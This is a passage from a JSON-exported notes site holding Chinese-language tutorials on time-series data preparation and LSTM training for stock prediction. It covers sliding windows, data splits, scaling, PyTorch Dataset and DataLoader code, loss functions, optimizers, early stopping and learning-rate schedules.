适用场景\n\n双向LSTM\n\n✅ 模型定义\n✅ 优劣势分析\n✅ 适用场景\n\nLSTM变体\n\n✅ 堆叠LSTM\n✅ 编码器-解码器LSTM\n✅ 注意力LSTM\n\n超参数选择\n\n✅ 关键超参数\n✅ 推荐值\n✅ 超参数搜索方法\n\n\n下一步\n继续学习: 时序数据处理系列"},"quant/qlib/week5/04_时序数据处理系列/index":{"slug":"quant/qlib/week5/04_时序数据处理系列/index","filePath":"quant/qlib/week5/04_时序数据处理系列/index.md","title":"index","links":["05_模型训练优化系列/"],"tags":[],"content":"时序数据处理系列 - 预处理与Dataset\n📚 系列概述\n本系列文档涵盖时序数据的构造、标准化、数据划分、PyTorch Dataset和DataLoader。\n\n📖 文档列表\n\n滑动窗口方法\n数据划分\n特征标准化\nPyTorch Dataset\nDataLoader\n\n\n滑动窗口方法\n原理\n\n使用过去N天的数据预测下一天\n窗口滑动，生成多个样本\n是构造时序训练数据的标准方法\n\n示例\n原始数据\nDay 1: [0.1, 0.2, 0.3]\nDay 2: [0.2, 0.3, 0.4]\nDay 3: [0.3, 0.4, 0.5]\nDay 4: [0.4, 0.5, 0.6]\nDay 5: [0.5, 0.6, 0.7]\n\n序列长度 = 3\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n样本输入 (X)目标 (y)1Day 1-3Day 42Day 2-4Day 5\nPython实现\nimport numpy as np\n \ndef create_sequences(data, seq_len, target_idx=0):\n    &quot;&quot;&quot;\n    滑动窗口构造时序序列\n \n    参数:\n        data: 原始数据 (n_samples, n_features)\n        seq_len: 序列长度\n        target_idx: 目标特征索引\n \n    返回:\n        X: 输入序列 (n_samples-seq_len, seq_len, n_features)\n        y: 目标值 (n_samples-seq_len,)\n    &quot;&quot;&quot;\n    X, y = [], []\n \n    for i in range(len(data) - seq_len):\n        X.append(data[i:i+seq_len])\n        y.append(data[i+seq_len, target_idx])\n \n    return np.array(X), np.array(y)\n \n# 示例\ndata = np.random.randn(100, 10)  # 100天，10个特征\nX, y = create_sequences(data, seq_len=20, target_idx=0)\n \nprint(X.shape)  # (80, 20, 10)\nprint(y.shape)  # (80,)\n高级滑动窗口\ndef create_sequences_multi_step(data, seq_len, target_len, target_idx=0):\n    &quot;&quot;&quot;\n    多步预测滑动窗口\n \n    参数:\n        data: 原始数据\n        seq_len: 输入序列长度\n        target_len: 预测步数\n        target_idx: 目标特征索引\n \n    返回:\n        X: (n_samples-seq_len-target_len, seq_len, n_features)\n        y: (n_samples-seq_len-target_len, target_len)\n    &quot;&quot;&quot;\n    X, y = [], []\n \n    for i in range(len(data) - seq_len - target_len):\n        X.append(data[i:i+seq_len])\n        y.append(data[i+seq_len:i+seq_len+target_len, target_idx])\n \n    return np.array(X), np.array(y)\n \n# 示例：预测未来5天\nX, y = create_sequences_multi_step(data, seq_len=20, target_len=5)\nprint(X.shape)  # (75, 20, 10)\nprint(y.shape)  # (75, 5)\n滑动窗口选择建议\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n预测目标seq_len说明短期预测5-10日内交易中期预测20-60几天到几周长期预测60-120几个月\n\n数据划分\n时间序列划分原则\n\n按时间顺序划分\n不能随机划分\n训练集 &lt; 验证集 &lt; 测试集\n\n划分方法\ndef time_series_split(data, train_ratio=0.7, val_ratio=0.15):\n    &quot;&quot;&quot;\n    时间序列数据划分\n \n    参数:\n        data: 完整数据\n        train_ratio: 训练集比例\n        val_ratio: 验证集比例\n \n    返回:\n        train, val, test\n    &quot;&quot;&quot;\n    n = len(data)\n    train_end = int(n * train_ratio)\n    val_end = int(n * (train_ratio + val_ratio))\n \n    train = data[:train_end]\n    val = data[train_end:val_end]\n    test = data[val_end:]\n \n    return train, val, test\n \n# 示例\ndata = np.random.randn(1000, 10)\ntrain, val, test = time_series_split(data)\n \nprint(f&quot;Train: {train.shape}&quot;)  # (700, 10)\nprint(f&quot;Val: {val.shape}&quot;)      # (150, 10)\nprint(f&quot;Test: {test.shape}&quot;)     # (150, 10)\n滚动窗口验证\nfrom sklearn.model_selection import TimeSeriesSplit\n \ntscv = TimeSeriesSplit(n_splits=5)\n \nfor fold, (train_index, test_index) in enumerate(tscv.split(X)):\n    X_train, X_test = X[train_index], X[test_index]\n    y_train, y_test = y[train_index], y[test_index]\n \n    print(f&quot;Fold {fold+1}:&quot;)\n    print(f&quot;  Train: {X_train.shape}&quot;)\n    print(f&quot;  Test: {X_test.shape}&quot;)\nWalk-Forward验证\ndef walk_forward_validation(data, initial_train_size, step_size):\n    &quot;&quot;&quot;\n    Walk-Forward验证\n \n    参数:\n        data: 完整数据\n        initial_train_size: 初始训练集大小\n        step_size: 每次前进步数\n    &quot;&quot;&quot;\n    splits = []\n    n = len(data)\n \n    train_end = initial_train_size\n \n    while train_end + step_size &lt; n:\n        test_start = train_end\n        test_end = min(test_start + step_size, n)\n \n        splits.append((\n            data[:train_end],\n            data[test_start:test_end]\n        ))\n \n        train_end += step_size\n \n    return splits\n \n# 示例\nsplits = walk_forward_validation(data, initial_train_size=500, step_size=100)\n \nfor i, (train, test) in enumerate(splits):\n    print(f&quot;Fold {i+1}: Train {train.shape}, Test {test.shape}&quot;)\n\n特征标准化\n标准化方法\n1. Z-score标准化（StandardScaler）\nfrom sklearn.preprocessing import StandardScaler\n \n# 拟合训练集\nscaler = StandardScaler()\nX_train_scaled = scaler.fit_transform(X_train.reshape(-1, X_train.shape[-1]))\n \n# 转换验证集和测试集\nX_val_scaled = scaler.transform(X_val.reshape(-1, X_val.shape[-1]))\nX_test_scaled = scaler.transform(X_test.reshape(-1, X_test.shape[-1]))\n \n# 恢复形状\nX_train_scaled = X_train_scaled.reshape(X_train.shape)\nX_val_scaled = X_val_scaled.reshape(X_val.shape)\nX_test_scaled = X_test_scaled.reshape(X_test.shape)\n2. Min-Max标准化\nfrom sklearn.preprocessing import MinMaxScaler\n \nscaler = MinMaxScaler(feature_range=(0, 1))\nX_train_scaled = scaler.fit_transform(X_train.reshape(-1, X_train.shape[-1]))\n \nX_val_scaled = scaler.transform(X_val.reshape(-1, X_val.shape[-1]))\nX_test_scaled = scaler.transform(X_test.reshape(-1, X_test.shape[-1]))\n \n# 恢复形状\nX_train_scaled = X_train_scaled.reshape(X_train.shape)\nX_val_scaled = X_val_scaled.reshape(X_val.shape)\nX_test_scaled = X_test_scaled.reshape(X_test.shape)\n3. RobustScaler\nfrom sklearn.preprocessing import RobustScaler\n \n# 对异常值更鲁棒\nscaler = RobustScaler()\nX_train_scaled = scaler.fit_transform(X_train.reshape(-1, X_train.shape[-1]))\n \nX_val_scaled = scaler.transform(X_val.reshape(-1, X_val.shape[-1]))\nX_test_scaled = scaler.transform(X_test.reshape(-1, X_test.shape[-1]))\n \n# 恢复形状\nX_train_scaled = X_train_scaled.reshape(X_train.shape)\nX_val_scaled = X_val_scaled.reshape(X_val.shape)\nX_test_scaled = X_test_scaled.reshape(X_test.shape)\n滚动标准化\ndef rolling_standardize(data, window=20):\n    &quot;&quot;&quot;\n    滚动窗口标准化\n \n    参数:\n        data: 原始数据 (n_samples, n_features)\n        window: 滚动窗口大小\n \n    返回:\n        scaled: 标准化后的数据\n    &quot;&quot;&quot;\n    scaled = np.zeros_like(data)\n \n    for i in range(len(data)):\n        if i &lt; window:\n            # 初期使用累积数据\n            mean = data[:i+1].mean(axis=0)\n            std = data[:i+1].std(axis=0)\n        else:\n            # 使用滚动窗口\n            mean = data[i-window:i].mean(axis=0)\n            std = data[i-window:i].std(axis=0)\n \n        scaled[i] = (data[i] - mean) / (std + 1e-8)\n \n    return scaled\n \n# 示例\nX_train_scaled = rolling_standardize(X_train, window=20)\n标准化注意事项\n1. 只用训练集拟合\n# ❌ 错误：用所有数据拟合\nscaler = StandardScaler()\nX_scaled = scaler.fit_transform(all_data)\n \n# ✅ 正确：只用训练集拟合\nscaler = StandardScaler()\nX_train_scaled = scaler.fit_transform(X_train)\nX_val_scaled = scaler.transform(X_val)\nX_test_scaled = scaler.transform(X_test)\n2. 反标准化预测结果\n# 预测\npredictions = model(X_test_scaled)\n \n# 反标准化\npredictions_original = scaler.inverse_transform(predictions)\n\nPyTorch Dataset\n自定义Dataset\nfrom torch.utils.data import Dataset\nimport torch\n \nclass TimeSeriesDataset(Dataset):\n    def __init__(self, X, y):\n        &quot;&quot;&quot;\n        参数:\n            X: 输入数据 (n_samples, seq_len, n_features)\n            y: 目标值 (n_samples,)\n        &quot;&quot;&quot;\n        self.X = torch.FloatTensor(X)\n        self.y = torch.FloatTensor(y)\n \n    def __len__(self):\n        &quot;&quot;&quot;返回样本数量&quot;&quot;&quot;\n        return len(self.X)\n \n    def __getitem__(self, idx):\n        &quot;&quot;&quot;\n        获取单个样本\n \n        返回:\n            X: (seq_len, n_features)\n            y: scalar\n        &quot;&quot;&quot;\n        return self.X[idx], self.y[idx]\n创建Dataset\n# 创建Dataset\ntrain_dataset = TimeSeriesDataset(X_train, y_train)\nval_dataset = TimeSeriesDataset(X_val, y_val)\ntest_dataset = TimeSeriesDataset(X_test, y_test)\n \n# 查看大小\nprint(f&quot;Train dataset size: {len(train_dataset)}&quot;)\nprint(f&quot;Val dataset size: {len(val_dataset)}&quot;)\nprint(f&quot;Test dataset size: {len(test_dataset)}&quot;)\n \n# 获取单个样本\nX_sample, y_sample = train_dataset[0]\nprint(f&quot;Sample X shape: {X_sample.shape}&quot;)\nprint(f&quot;Sample y: {y_sample}&quot;)\n高级Dataset\nclass AdvancedTimeSeriesDataset(Dataset):\n    def __init__(self, X, y, transform=None):\n        self.X = torch.FloatTensor(X)\n        self.y = torch.FloatTensor(y)\n        self.transform = transform\n \n    def __len__(self):\n        return len(self.X)\n \n    def __getitem__(self, idx):\n        X, y = self.X[idx], self.y[idx]\n \n        # 应用变换\n        if self.transform:\n            X = self.transform(X)\n \n        return X, y\n \n# 定义变换\ndef add_noise(x, noise_level=0.01):\n    &quot;&quot;&quot;添加噪声&quot;&quot;&quot;\n    noise = torch.randn_like(x) * noise_level\n    return x + noise\n \n# 创建Dataset\ntrain_dataset = AdvancedTimeSeriesDataset(\n    X_train,\n    y_train,\n    transform=lambda x: add_noise(x, 0.01)\n)\n\nDataLoader\n创建DataLoader\nfrom torch.utils.data import DataLoader\n \n# 创建DataLoader\ntrain_loader = DataLoader(\n    train_dataset,\n    batch_size=32,\n    shuffle=True,  # 训练集打乱\n    num_workers=4,\n    pin_memory=True  # 加速GPU传输\n)\n \nval_loader = DataLoader(\n    val_dataset,\n    batch_size=32,\n    shuffle=False,  # 验证集不打乱\n    num_workers=4,\n    pin_memory=True\n)\n \ntest_loader = DataLoader(\n    test_dataset,\n    batch_size=32,\n    shuffle=False,\n    num_workers=4,\n    pin_memory=True\n)\n使用DataLoader\n# 训练循环\nfor epoch in range(num_epochs):\n    model.train()\n \n    for batch_idx, (X_batch, y_batch) in enumerate(train_loader):\n        # 前向传播\n        predictions = model(X_batch)\n        loss = criterion(predictions.squeeze(), y_batch)\n \n        # 反向传播\n        optimizer.zero_grad()\n        loss.backward()\n        optimizer.step()\n \n        # 打印进度\n        if batch_idx % 100 == 0:\n            print(f&quot;Epoch {epoch}, Batch {batch_idx}, Loss: {loss.item():.4f}&quot;)\n \n    # 验证\n    model.eval()\n    val_loss = 0.0\n    with torch.no_grad():\n        for X_batch, y_batch in val_loader:\n            predictions = model(X_batch)\n            loss = criterion(predictions.squeeze(), y_batch)\n            val_loss += loss.item()\n \n    val_loss /= len(val_loader)\n    print(f&quot;Epoch {epoch}, Val Loss: {val_loss:.4f}&quot;)\nDataLoader参数\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数说明推荐值batch_size批大小32, 64, 128shuffle是否打乱训练集=True，验证/测试=Falsenum_workers加载进程数4-8pin_memory锁页内存True（GPU训练）drop_last丢弃不完整batchFalse\n动态批大小\n# 根据序列长度动态调整\nclass DynamicBatchSampler:\n    def __init__(self, dataset, max_batch_size=32):\n        self.dataset = dataset\n        self.max_batch_size = max_batch_size\n \n    def __iter__(self):\n        batch = []\n        for idx in range(len(self.dataset)):\n            batch.append(idx)\n            if len(batch) &gt;= self.max_batch_size:\n                yield batch\n                batch = []\n \n        if batch:\n            yield batch\n \n# 使用\ntrain_loader = DataLoader(\n    train_dataset,\n    batch_sampler=DynamicBatchSampler(train_dataset, max_batch_size=32),\n    collate_fn=lambda batch: default_collate([train_dataset[i] for i in batch])\n)\n\n数据处理流程\n完整流程\nimport numpy as np\nimport torch\nfrom torch.utils.data import Dataset, DataLoader\nfrom sklearn.preprocessing import StandardScaler\n \n# 1. 加载数据\ndata = np.load(&#039;stock_data.npy&#039;)  # (n_days, n_features)\n \n# 2. 构造序列\ndef create_sequences(data, seq_len, target_idx=0):\n    X, y = [], []\n    for i in range(len(data) - seq_len):\n        X.append(data[i:i+seq_len])\n        y.append(data[i+seq_len, target_idx])\n    return np.array(X), np.array(y)\n \nX, y = create_sequences(data, seq_len=20)\n \n# 3. 划分数据\ntrain_size = int(0.7 * len(X))\nval_size = int(0.15 * len(X))\n \nX_train, X_val, X_test = X[:train_size], X[train_size:train_size+val_size], X[train_size+val_size:]\ny_train, y_val, y_test = y[:train_size], y[train_size:train_size+val_size], y[train_size+val_size:]\n \n# 4. 标准化\nscaler = StandardScaler()\nX_train_scaled = scaler.fit_transform(X_train.reshape(-1, X_train.shape[-1])).reshape(X_train.shape)\nX_val_scaled = scaler.transform(X_val.reshape(-1, X_val.shape[-1])).reshape(X_val.shape)\nX_test_scaled = scaler.transform(X_test.reshape(-1, X_test.shape[-1])).reshape(X_test.shape)\n \n# 5. 创建Dataset\nclass TimeSeriesDataset(Dataset):\n    def __init__(self, X, y):\n        self.X = torch.FloatTensor(X)\n        self.y = torch.FloatTensor(y)\n \n    def __len__(self):\n        return len(self.X)\n \n    def __getitem__(self, idx):\n        return self.X[idx], self.y[idx]\n \ntrain_dataset = TimeSeriesDataset(X_train_scaled, y_train)\nval_dataset = TimeSeriesDataset(X_val_scaled, y_val)\ntest_dataset = TimeSeriesDataset(X_test_scaled, y_test)\n \n# 6. 创建DataLoader\ntrain_loader = DataLoader(train_dataset, batch_size=32, shuffle=True)\nval_loader = DataLoader(val_dataset, batch_size=32, shuffle=False)\ntest_loader = DataLoader(test_dataset, batch_size=32, shuffle=False)\n \nprint(f&quot;Train: {len(train_dataset)} samples&quot;)\nprint(f&quot;Val: {len(val_dataset)} samples&quot;)\nprint(f&quot;Test: {len(test_dataset)} samples&quot;)\n\n核心知识点总结\n滑动窗口\n\n✅ 基本原理\n✅ 单步预测\n✅ 多步预测\n✅ 序列长度选择\n\n数据划分\n\n✅ 时间序列划分原则\n✅ 滚动窗口验证\n✅ Walk-Forward验证\n\n特征标准化\n\n✅ Z-score标准化\n✅ Min-Max标准化\n✅ RobustScaler\n✅ 滚动标准化\n\nDataset\n\n✅ 自定义Dataset\n✅ 高级Dataset\n✅ 数据变换\n\nDataLoader\n\n✅ 创建DataLoader\n✅ 参数配置\n✅ 使用示例\n\n\n下一步\n继续学习: 模型训练优化系列"},"quant/qlib/week5/05_模型训练优化系列/index":{"slug":"quant/qlib/week5/05_模型训练优化系列/index","filePath":"quant/qlib/week5/05_模型训练优化系列/index.md","title":"index","links":["06_实战应用系列/"],"tags":[],"content":"模型训练优化系列 - 训练与优化策略\n📚 系列概述\n本系列文档涵盖损失函数、优化器、训练循环、早停策略、正则化方法和超参数优化。\n\n📖 文档列表\n\n损失函数\n优化器\n训练循环\n早停策略\n正则化\n学习率调度\n\n\n损失函数\n回归任务损失函数\n1. MSE（Mean Squared Error）\nimport torch.nn as nn\n \ncriterion = nn.MSELoss()\n \npredictions = torch.randn(10, 1)\ntargets = torch.randn(10, 1)\n \nloss = criterion(predictions, targets)\n特点:\n\n对大误差敏感\n计算简单\n常用\n\n适用场景:\n\n回归任务\n异常值较少的数据\n\n2. MAE（Mean Absolute Error）\ncriterion = nn.L1Loss()\n \nloss = criterion(predictions, targets)\n特点:\n\n对异常值鲁棒\n梯度恒定\n不常用\n\n适用场景:\n\n异常值较多\n需要鲁棒性\n\n3. Smooth L1 Loss\ncriterion = nn.SmoothL1Loss()\n \nloss = criterion(predictions, targets)\n特点:\n\nMSE和MAE的折中\n对异常值鲁棒\n推荐使用\n\n适用场景:\n\n通用回归任务\n平衡鲁棒性和稳定性\n\n自定义损失函数\ndef custom_loss(predictions, targets, model, lambda_l1=0.01, lambda_l2=0.01):\n    &quot;&quot;&quot;\n    自定义损失函数\n \n    参数:\n        predictions: 模型预测\n        targets: 真实值\n        model: 模型\n        lambda_l1: L1正则化系数\n        lambda_l2: L2正则化系数\n    &quot;&quot;&quot;\n    # MSE\n    mse = torch.mean((predictions - targets) ** 2)\n \n    # L1正则化\n    l1_reg = sum(p.abs().sum() for p in model.parameters())\n \n    # L2正则化\n    l2_reg = sum(p.pow(2).sum() for p in model.parameters())\n \n    # 总损失\n    total_loss = mse + lambda_l1 * l1_reg + lambda_l2 * l2_reg\n \n    return total_loss\n损失函数选择建议\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n场景推荐损失函数通用回归MSE异常值多MAE平衡选择Smooth L1需要正则化自定义损失\n\n优化器\n常用优化器\n1. SGD（随机梯度下降）\noptimizer = torch.optim.SGD(\n    model.parameters(),\n    lr=0.01,\n    momentum=0.9,\n    weight_decay=1e-4  # L2正则化\n)\n特点:\n\n简单稳定\n收敛慢\n需要调参\n\n适用场景:\n\n数据量大\n需要稳定训练\n\n2. Adam（推荐）\noptimizer = torch.optim.Adam(\n    model.parameters(),\n    lr=0.001,\n    betas=(0.9, 0.999),\n    weight_decay=1e-4\n)\n特点:\n\n自适应学习率\n收敛快\n默认选择\n\n适用场景:\n\n通用场景\n快速迭代\n\n3. RMSprop\noptimizer = torch.optim.RMSprop(\n    model.parameters(),\n    lr=0.001,\n    alpha=0.99\n)\n特点:\n\n适合RNN\n自适应学习率\n\n适用场景:\n\nRNN/LSTM\n时序预测\n\n优化器对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优化器适用场景优点缺点推荐学习率SGD数据量大简单稳定收敛慢0.01-0.1Adam通用收敛快可能过拟合0.0001-0.001RMSpropRNN适合序列参数调整0.001-0.01\n优化器选择建议\n选择Adam:\n\n默认选择\n快速迭代\n通用场景\n\n选择SGD:\n\n数据量大\n需要稳定\n研究论文\n\n选择RMSprop:\n\nRNN/LSTM\n时序预测\n\n\n训练循环\n完整训练循环\nimport copy\nfrom tqdm import tqdm\n \ndef train_model(model, train_loader, val_loader, criterion, optimizer, num_epochs=50):\n    &quot;&quot;&quot;\n    训练模型\n \n    参数:\n        model: 模型\n        train_loader: 训练数据加载器\n        val_loader: 验证数据加载器\n        criterion: 损失函数\n        optimizer: 优化器\n        num_epochs: 训练轮数\n \n    返回:\n        model: 最佳模型\n        train_losses: 训练损失\n        val_losses: 验证损失\n    &quot;&quot;&quot;\n \n    # 记录损失\n    train_losses = []\n    val_losses = []\n \n    # 最佳模型\n    best_model = None\n    best_val_loss = float(&#039;inf&#039;)\n \n    for epoch in range(num_epochs):\n        # 训练阶段\n        model.train()\n        train_loss = 0.0\n \n        # 使用进度条\n        pbar = tqdm(train_loader, desc=f&#039;Epoch {epoch+1}/{num_epochs}&#039;)\n \n        for X_batch, y_batch in pbar:\n            # 前向传播\n            predictions = model(X_batch)\n            loss = criterion(predictions.squeeze(), y_batch)\n \n            # 反向传播\n            optimizer.zero_grad()\n            loss.backward()\n \n            # 梯度裁剪\n            torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)\n \n            # 参数更新\n            optimizer.step()\n \n            train_loss += loss.item()\n \n            # 更新进度条\n            pbar.set_postfix({&#039;loss&#039;: loss.item()})\n \n        train_loss /= len(train_loader)\n        train_losses.append(train_loss)\n \n        # 验证阶段\n        model.eval()\n        val_loss = 0.0\n \n        with torch.no_grad():\n            for X_batch, y_batch in val_loader:\n                predictions = model(X_batch)\n                loss = criterion(predictions.squeeze(), y_batch)\n                val_loss += loss.item()\n \n        val_loss /= len(val_loader)\n        val_losses.append(val_loss)\n \n        # 保存最佳模型\n        if val_loss &lt; best_val_loss:\n            best_val_loss = val_loss\n            best_model = copy.deepcopy(model.state_dict())\n \n        # 打印进度\n        print(f&quot;Epoch {epoch+1}/{num_epochs}&quot;)\n        print(f&quot;  Train Loss: {train_loss:.4f}&quot;)\n        print(f&quot;  Val Loss: {val_loss:.4f}&quot;)\n \n    # 加载最佳模型\n    model.load_state_dict(best_model)\n \n    return model, train_losses, val_losses\n训练循环示例\n# 定义模型\nmodel = LSTMModel(\n    input_size=10,\n    hidden_size=64,\n    num_layers=2,\n    output_size=1\n)\n \n# 定义损失函数和优化器\ncriterion = nn.MSELoss()\noptimizer = torch.optim.Adam(model.parameters(), lr=0.001)\n \n# 训练\nmodel, train_losses, val_losses = train_model(\n    model=model,\n    train_loader=train_loader,\n    val_loader=val_loader,\n    criterion=criterion,\n    optimizer=optimizer,\n    num_epochs=50\n)\n\n早停策略（Early Stopping）\n原理\n\n监控验证集损失\n连续N个epoch不改善则停止\n防止过拟合\n\n实现\nclass EarlyStopping:\n    def __init__(self, patience=7, min_delta=0, verbose=True):\n        &quot;&quot;&quot;\n        早停策略\n \n        参数:\n            patience: 容忍不改善的epoch数\n            min_delta: 最小改善幅度\n            verbose: 是否打印信息\n        &quot;&quot;&quot;\n        self.patience = patience\n        self.min_delta = min_delta\n        self.verbose = verbose\n        self.counter = 0\n        self.best_loss = None\n        self.early_stop = False\n        self.best_model = None\n \n    def __call__(self, val_loss, model):\n        if self.best_loss is None:\n            self.best_loss = val_loss\n            self.save_checkpoint(val_loss, model)\n        elif val_loss &gt; self.best_loss - self.min_delta:\n            self.counter += 1\n            if self.verbose:\n                print(f&#039;EarlyStopping counter: {self.counter} out of {self.patience}&#039;)\n            if self.counter &gt;= self.patience:\n                self.early_stop = True\n        else:\n            self.best_loss = val_loss\n            self.save_checkpoint(val_loss, model)\n            self.counter = 0\n \n    def save_checkpoint(self, val_loss, model):\n        &quot;&quot;&quot;保存最佳模型&quot;&quot;&quot;\n        if self.verbose:\n            print(f&#039;Validation loss decreased ({self.best_loss:.6f} --&gt; {val_loss:.6f}). Saving model...&#039;)\n        self.best_model = copy.deepcopy(model.state_dict())\n \n    def load_best_model(self, model):\n        &quot;&quot;&quot;加载最佳模型&quot;&quot;&quot;\n        if self.best_model is not None:\n            model.load_state_dict(self.best_model)\n使用早停\n# 创建早停\nearly_stopping = EarlyStopping(patience=10, min_delta=0.0001, verbose=True)\n \n# 训练循环\nfor epoch in range(num_epochs):\n    # 训练\n    train_loss = train(model, train_loader, criterion, optimizer)\n \n    # 验证\n    val_loss = validate(model, val_loader, criterion)\n \n    # 检查早停\n    early_stopping(val_loss, model)\n    if early_stopping.early_stop:\n        print(&quot;Early stopping!&quot;)\n        break\n \n# 加载最佳模型\nearly_stopping.load_best_model(model)\n\n正则化\n1. L1/L2正则化\ndef l1_regularization(model, lambda_l1=0.01):\n    &quot;&quot;&quot;\n    L1正则化\n \n    参数:\n        model: 模型\n        lambda_l1: L1系数\n \n    返回:\n        L1损失\n    &quot;&quot;&quot;\n    l1_loss = 0\n    for param in model.parameters():\n        l1_loss += torch.sum(torch.abs(param))\n    return lambda_l1 * l1_loss\n \ndef l2_regularization(model, lambda_l2=0.01):\n    &quot;&quot;&quot;\n    L2正则化\n \n    参数:\n        model: 模型\n        lambda_l2: L2系数\n \n    返回:\n        L2损失\n    &quot;&quot;&quot;\n    l2_loss = 0\n    for param in model.parameters():\n        l2_loss += torch.sum(param ** 2)\n    return lambda_l2 * l2_loss\n \n# 使用\nloss = criterion(predictions, targets)\nloss += l1_regularization(model, lambda_l1=0.01)\nloss += l2_regularization(model, lambda_l2=0.01)\n2. Dropout\nclass LSTMModelWithDropout(nn.Module):\n    def __init__(self, input_size, hidden_size, dropout=0.2):\n        super().__init__()\n        self.lstm = nn.LSTM(input_size, hidden_size, batch_first=True)\n        self.dropout = nn.Dropout(dropout)  # Dropout层\n        self.fc = nn.Linear(hidden_size, 1)\n \n    def forward(self, x):\n        lstm_out, _ = self.lstm(x)\n        lstm_out = self.dropout(lstm_out)\n        output = self.fc(lstm_out[:, -1, :])\n        return output\n3. 批量归一化（BatchNorm）\nclass LSTMModelWithBN(nn.Module):\n    def __init__(self, input_size, hidden_size):\n        super().__init__()\n        self.lstm = nn.LSTM(input_size, hidden_size, batch_first=True)\n        self.bn = nn.BatchNorm1d(hidden_size)  # BatchNorm\n        self.fc = nn.Linear(hidden_size, 1)\n \n    def forward(self, x):\n        lstm_out, _ = self.lstm(x)\n        lstm_out = self.bn(lstm_out[:, -1, :])\n        output = self.fc(lstm_out)\n        return output\n4. 梯度裁剪\n# 反向传播后\nloss.backward()\n \n# 梯度裁剪\ntorch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)\n \n# 或梯度裁剪\ntorch.nn.utils.clip_grad_value_(model.parameters(), clip_value=0.5)\n\n学习率调度\n学习率衰减\n1. StepLR\nscheduler = torch.optim.lr_scheduler.StepLR(\n    optimizer,\n    step_size=10,  # 每10个epoch\n    gamma=0.1      # 学习率乘0.1\n)\n \n# 训练循环\nfor epoch in range(num_epochs):\n    train(model, train_loader, optimizer, criterion)\n    scheduler.step()  # 更新学习率\n2. ReduceLROnPlateau\nscheduler = torch.optim.lr_scheduler.ReduceLROnPlateau(\n    optimizer,\n    mode=&#039;min&#039;,      # 监控指标越小越好\n    factor=0.1,      # 学习率乘0.1\n    patience=5,      # 容忍5个epoch不改善\n    verbose=True\n)\n \n# 训练循环\nfor epoch in range(num_epochs):\n    train_loss = train(model, train_loader, optimizer, criterion)\n    val_loss = validate(model, val_loader, criterion)\n    scheduler.step(val_loss)  # 基于验证损失调整\n3. CosineAnnealingLR\nscheduler = torch.optim.lr_scheduler.CosineAnnealingLR(\n    optimizer,\n    T_max=50,        # 总epoch数\n    eta_min=1e-6     # 最小学习率\n)\n \n# 训练循环\nfor epoch in range(num_epochs):\n    train(model, train_loader, optimizer, criterion)\n    scheduler.step()\n4. Warmup\nfrom torch.optim.lr_scheduler import LambdaLR\n \ndef warmup_lambda(epoch, warmup_epochs=10):\n    &quot;&quot;&quot;Warmup学习率调度&quot;&quot;&quot;\n    if epoch &lt; warmup_epochs:\n        return epoch / warmup_epochs\n    return 1.0\n \nscheduler = LambdaLR(\n    optimizer,\n    lr_lambda=lambda epoch: warmup_lambda(epoch, warmup_epochs=10)\n)\n学习率可视化\nimport matplotlib.pyplot as plt\n \n# 记录学习率\nlearning_rates = []\n \nfor epoch in range(num_epochs):\n    # 训练\n    train(model, train_loader, optimizer, criterion)\n \n    # 记录学习率\n    learning_rates.append(optimizer.param_groups[0][&#039;lr&#039;])\n \n    # 更新学习率\n    scheduler.step()\n \n# 绘制学习率曲线\nplt.figure(figsize=(10, 6))\nplt.plot(range(num_epochs), learning_rates)\nplt.xlabel(&#039;Epoch&#039;)\nplt.ylabel(&#039;Learning Rate&#039;)\nplt.title(&#039;Learning Rate Schedule&#039;)\nplt.show()\n\n训练技巧\n1. 混合精度训练\nfrom torch.cuda.amp import autocast, GradScaler\n \nscaler = GradScaler()\n \nfor X_batch, y_batch in train_loader:\n    optimizer.zero_grad()\n \n    with autocast():\n        predictions = model(X_batch)\n        loss = criterion(predictions.squeeze(), y_batch)\n \n    scaler.scale(loss).backward()\n    scaler.step(optimizer)\n    scaler.update()\n2. 梯度累积\naccumulation_steps = 4\n \nfor i, (X_batch, y_batch) in enumerate(train_loader):\n    predictions = model(X_batch)\n    loss = criterion(predictions.squeeze(), y_batch)\n \n    loss = loss / accumulation_steps\n    loss.backward()\n \n    if (i + 1) % accumulation_steps == 0:\n        optimizer.step()\n        optimizer.zero_grad()\n3. 模型并行\n# 多GPU训练\nif torch.cuda.device_count() &gt; 1:\n    model = nn.DataParallel(model)\n \nmodel.to(&#039;cuda&#039;)\n\n核心知识点总结\n损失函数\n\n✅ MSE、MAE、Smooth L1\n✅ 自定义损失函数\n✅ 选择建议\n\n优化器\n\n✅ SGD、Adam、RMSprop\n✅ 优化器对比\n✅ 选择建议\n\n训练循环\n\n✅ 完整训练循环\n✅ 进度条\n✅ 梯度裁剪\n\n早停策略\n\n✅ EarlyStopping实现\n✅ 使用方法\n✅ 模型保存\n\n正则化\n\n✅ L1/L2正则化\n✅ Dropout\n✅ BatchNorm\n✅ 梯度裁剪\n\n学习率调度\n\n✅ StepLR\n✅ ReduceLROnPlateau\n✅ CosineAnnealingLR\n✅ Warmup\n\n\n下一步\n继续学习: 实战应用系列"},"quant/qlib/week5/06_实战应用系列/index":{"slug":"quant/qlib/week5/06_实战应用系列/index","filePath":"quant/qlib/week5/06_实战应用系列/index.md","title":"index","links":[],"tags":[],"content":"实战应用系列 - 案例与最佳实践\n📚 系列概述\n本系列文档涵盖完整的LSTM预测流程、超参数调优、模型保存与加载、评估指标和最佳实践。\n\n📖 文档列表\n\n完整预测流程\n超参数调优\n模型保存与加载\n评估指标\nLSTM vs LightGBM\n最佳实践\n\n\n完整预测流程\n步骤1: 数据准备\nimport pandas as pd\nimport numpy as np\n \n# 加载数据\ndata = pd.read_csv(&#039;stock_prices.csv&#039;)\n \n# 特征工程\nfeatures = [&#039;close&#039;, &#039;volume&#039;, &#039;ma5&#039;, &#039;ma20&#039;, &#039;rsi&#039;]\ndata = data[features].values\n \n# 标准化\nfrom sklearn.preprocessing import StandardScaler\nscaler = StandardScaler()\ndata_scaled = scaler.fit_transform(data)\n \n# 构造序列\ndef create_sequences(data, 